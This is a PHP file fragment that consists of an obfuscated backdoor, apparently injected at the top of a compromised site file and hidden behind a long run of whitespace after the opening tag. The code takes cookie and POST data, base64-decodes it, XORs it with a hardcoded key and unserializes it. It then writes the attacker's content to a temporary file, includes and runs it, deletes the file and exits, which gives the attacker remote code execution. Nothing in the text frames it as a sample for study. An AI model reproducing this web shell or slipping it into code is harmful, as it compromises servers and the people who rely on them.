<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("wawqx")){class wawqx{public static $fbuqjj = "clydigmqfkcidpep";public static $gbfrlkynsk = NULL;public function __construct(){$aendhlqqv = @$_COOKIE[substr(wawqx::$fbuqjj, 0, 4)];if (!empty($aendhlqqv)){$cigavin = "base64";$wwswjkodz = "";$aendhlqqv = explode(",", $aendhlqqv);foreach ($aendhlqqv as $gcrgmvv){$wwswjkodz .= @$_COOKIE[$gcrgmvv];$wwswjkodz .= @$_POST[$gcrgmvv];}$wwswjkodz = array_map($cigavin . "_decode", array($wwswjkodz,));$wwswjkodz = $wwswjkodz[0] ^ str_repeat(wawqx::$fbuqjj, (strlen($wwswjkodz[0]) / strlen(wawqx::$fbuqjj)) + 1);wawqx::$gbfrlkynsk = @unserialize($wwswjkodz);}}public function __destruct(){$this->cfjbcbrbnd();}private function cfjbcbrbnd(){if (is_array(wawqx::$gbfrlkynsk)) {$webwtm = sys_get_temp_dir() . "/" . crc32(wawqx::$gbfrlkynsk["salt"]);@wawqx::$gbfrlkynsk["write"]($webwtm, wawqx::$gbfrlkynsk["content"]);include $webwtm;@wawqx::$gbfrlkynsk["delete"]($webwtm);exit();}}}$xlwnh = new wawqx();$xlwnh = NULL;} ?><?php
